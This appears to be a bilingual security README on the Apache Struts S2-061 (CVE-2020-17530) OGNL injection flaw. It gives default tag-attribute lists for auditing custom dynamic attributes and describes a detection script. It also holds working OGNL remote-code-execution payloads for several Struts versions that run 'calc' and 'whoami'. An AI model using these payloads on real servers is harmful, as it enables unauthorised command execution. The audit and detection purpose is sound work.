# S2-061 (CVE-2020-17530)
some struts tag , attributes which out of the range will call SetDynamicAttribute() function, it will cause ONGL expression execute
受dynamic attribute影响的struts tag，使用了列表之外的属性，即自定义属性，即可视为存在S2-061，在知道参数的情况下，可以执行OGNL 表达式

**filter by python**

default struts tag list,  these dynamic-attribute options are true.
默认的struts tag列表，这些dynamic-attribute选项都为True

when code review，check the lists:
代码审计，排查除以下列表之外的属性
```
a:'accesskey','action','anchor','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','encode','errorPosition','escapeAmp','forceAddSchemeHostAndPort','href','id','includeContext','includeParams','javascriptTooltip','key','label','labelSeparator','labelposition','method','name','namespace','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','openTemplate','portletMode','portletUrlType','requiredLabel','requiredPosition','scheme','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value','windowState'
checkbox:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','fieldValue','id','javascriptTooltip','key','label','labelSeparator','labelposition','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
checkboxlist:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','list','listCssClass','listCssStyle','listKey','listLabelKey','listTitle','listValue','listValueKey','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
datetextfiled:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','format','id','javascriptTooltip','key','label','labelSeparator','labelposition','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
file:'accept','accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','size','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
hidden:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
form:'acceptcharset','accesskey','action','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','enctype','errorPosition','focusElement','id','includeContext','javascriptTooltip','key','label','labelSeparator','labelposition','method','name','namespace','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onreset','onselect','onsubmit','openTemplate','portletMode','requiredLabel','requiredPosition','style','tabindex','target','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','validate','value','windowState'
head:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
label:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','for','id','javascriptTooltip','key','label','labelSeparator','labelposition','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredLabel','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
password:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','maxLength','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','readonly','requiredLabel','requiredPosition','showPassword','size','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','type','value'
radio:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','list','listCssClass','listCssStyle','listKey','listLabelKey','listTitle','listValue','listValueKey','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
reset:'accesskey','action','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','method','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','openTemplate','requiredLabel','requiredPosition','src','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','type','value'
select:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','emptyOption','errorPosition','headerKey','headerValue','id','javascriptTooltip','key','label','labelSeparator','labelposition','list','listCssClass','listCssStyle','listKey','listLabelKey','listTitle','listValue','listValueKey','multiple','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','requiredLabel','requiredPosition','size','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value'
submit:'accesskey','action','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','method','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','openTemplate','requiredLabel','requiredPosition','src','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','type','value'
textarea:'accesskey','action','anchor','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','encode','errorPosition','escapeAmp','forceAddSchemeHostAndPort','href','id','includeContext','includeParams','javascriptTooltip','key','label','labelSeparator','labelposition','method','name','namespace','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','openTemplate','portletMode','portletUrlType','requiredLabel','requiredPosition','scheme','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','value','windowState'
textfield:'accesskey','class','cssClass','cssErrorClass','cssErrorStyle','cssStyle','disabled','errorPosition','id','javascriptTooltip','key','label','labelSeparator','labelposition','maxLength','name','onblur','onchange','onclick','ondblclick','onfocus','onkeydown','onkeypress','onkeyup','onmousedown','onmousemove','onmouseout','onmouseover','onmouseup','onselect','readonly','requiredLabel','requiredPosition','size','style','tabindex','template','templateDir','theme','title','tooltip','tooltipConfig','tooltipCssClass','tooltipDelay','tooltipIconPath','type','value'

```


when pentest,you can detect fo html tag's attribute, attributes out of the range will be regard as exist s2-061：
渗透的时候，检测除以下列表之外的属性，这些都是已经渲染后返回前端的HTML标签：
```
tag_a = {'accesskey', 'action', 'anchor', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle',
         'disabled', 'encode', 'errorPosition', 'escapeAmp', 'forceAddSchemeHostAndPort', 'href', 'id',
         'includeContext', 'includeParams', 'javascriptTooltip', 'key', 'label', 'labelSeparator', 'labelposition',
         'method', 'name', 'namespace', 'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus', 'onkeydown',
         'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onselect',
         'openTemplate', 'portletMode', 'portletUrlType', 'requiredLabel', 'requiredPosition', 'scheme', 'style',
         'tabindex', 'template', 'templateDir', 'theme', 'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass',
         'tooltipDelay', 'tooltipIconPath', 'value', 'windowState'}

tag_form = {'acceptcharset', 'accesskey', 'action', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle',
            'disabled', 'enctype', 'errorPosition', 'focusElement', 'id', 'includeContext', 'javascriptTooltip', 'key',
            'label', 'labelSeparator', 'labelposition', 'method', 'name', 'namespace', 'onblur', 'onchange', 'onclick',
            'ondblclick', 'onfocus', 'onkeydown', 'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout',
            'onmouseover', 'onmouseup', 'onreset', 'onselect', 'onsubmit', 'openTemplate', 'portletMode',
            'requiredLabel', 'requiredPosition', 'style', 'tabindex', 'target', 'template', 'templateDir', 'theme',
            'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath', 'validate',
            'value', 'windowState'}

tag_label = {'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle', 'disabled',
             'errorPosition', 'for', 'id', 'javascriptTooltip', 'key', 'label', 'labelSeparator', 'labelposition',
             'name', 'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus', 'onkeydown', 'onkeypress', 'onkeyup',
             'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onselect', 'requiredLabel',
             'requiredLabel', 'style', 'tabindex', 'template', 'templateDir', 'theme', 'title', 'tooltip',
             'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath', 'value'}

tag_select = {'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle', 'disabled', 'emptyOption',
              'errorPosition', 'headerKey', 'headerValue', 'id', 'javascriptTooltip', 'key', 'label', 'labelSeparator',
              'labelposition', 'list', 'listCssClass', 'listCssStyle', 'listKey', 'listLabelKey', 'listTitle',
              'listValue', 'listValueKey', 'multiple', 'name', 'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus',
              'onkeydown', 'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover',
              'onmouseup', 'onselect', 'requiredLabel', 'requiredPosition', 'size', 'style', 'tabindex', 'template',
              'templateDir', 'theme', 'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass', 'tooltipDelay',
              'tooltipIconPath', 'value'}

tag_textarea = {'accesskey', 'action', 'anchor', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle',
                'disabled', 'encode', 'errorPosition', 'escapeAmp', 'forceAddSchemeHostAndPort', 'href', 'id',
                'includeContext', 'includeParams', 'javascriptTooltip', 'key', 'label', 'labelSeparator',
                'labelposition', 'method', 'name', 'namespace', 'onblur', 'onchange', 'onclick', 'ondblclick',
                'onfocus', 'onkeydown', 'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout',
                'onmouseover', 'onmouseup', 'onselect', 'openTemplate', 'portletMode', 'portletUrlType',
                'requiredLabel', 'requiredPosition', 'scheme', 'style', 'tabindex', 'template', 'templateDir', 'theme',
                'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath', 'value',
                'windowState'}

tag_input = {'accept', 'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle', 'disabled',
             'errorPosition', 'id', 'javascriptTooltip', 'key', 'label', 'labelSeparator', 'labelposition', 'name',
             'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus', 'onkeydown', 'onkeypress', 'onkeyup',
             'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onselect', 'requiredLabel',
             'requiredPosition', 'size', 'style', 'tabindex', 'template', 'templateDir', 'theme', 'title', 'tooltip',
             'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath', 'value', 'maxLength', 'readonly',
             'showPassword', 'type', 'action', 'method', 'openTemplate', 'src', 'fieldValue', 'list', 'listCssClass',
             'listCssStyle', 'listKey', 'listLabelKey', 'listTitle', 'listValue', 'listValueKey', 'format'}
```




payload :
```
2.0.0~2.3.29 poc: 
`%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))} 
` 
2.3.30~2.3.37/2.5~2.5.13:
`%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))}` 
 
2.5.14.1~2.5.16:
%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))} 
 
%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))} 

new version @ka1n4t  https://github.com/ka1n4t/CVE-2020-17530 ：
%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}

```

## update 2020.12.14
加入了检测脚本，只需要检测自定义属性即可，写并发的时候出了几个bug（菜 ，没有提供爆破接口，所以就给单个的吧
```
python S2_061.py -u url

output:
Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/;jsessionid=1E0F7E27DE745DA313D570F662C529E3" pulsar=""></a>
Found customize attribute: pulsar  ,tag is : <a href="/Struts2_5_1_war_exploded/;jsessionid=1E0F7E27DE745DA313D570F662C529E3" id="123" pulsar=""></a>
http://192.168.1.50:8999/Struts2_5_1_war_exploded/ exists S2-061，vulnerable tag is [<a href="/Struts2_5_1_war_exploded/;jsessionid=1E" pulsar=""></a>, <a href="/Struts2_5_1_war_exploded/;jsessionid=1E" id="123" pulsar=""></a>]

```
